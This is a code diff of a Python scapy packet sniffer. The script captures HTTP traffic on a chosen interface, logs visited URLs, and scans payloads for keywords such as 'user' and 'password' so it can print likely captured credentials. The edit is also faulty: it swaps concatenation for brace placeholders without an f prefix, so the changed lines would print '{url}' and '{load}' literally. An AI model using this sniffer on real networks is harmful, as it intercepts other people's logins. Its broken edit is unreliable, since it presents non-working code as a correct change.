@@ -12,13 +12,13 @@ def sniffer(interface):
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
         url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
-        print(colored("Http Request >>> " + str(url), "white"))
+        print(colored("Http Request >>> {url}", "white"))
         if packet.haslayer(scapy.Raw):
             load = packet[scapy.Raw].load
             keywords = ["user", "username", "email", "pass", "password"]
             for keyword in keywords:
                 if keyword in load:
-                    print(colored("Possible username/password >>> " + str(load), "blue"))
+                    print(colored("Possible username/password >>> {load}", "blue"))
                     break
 
 interface = input(colored("\n\nEnter Interface >>> ", "white"))
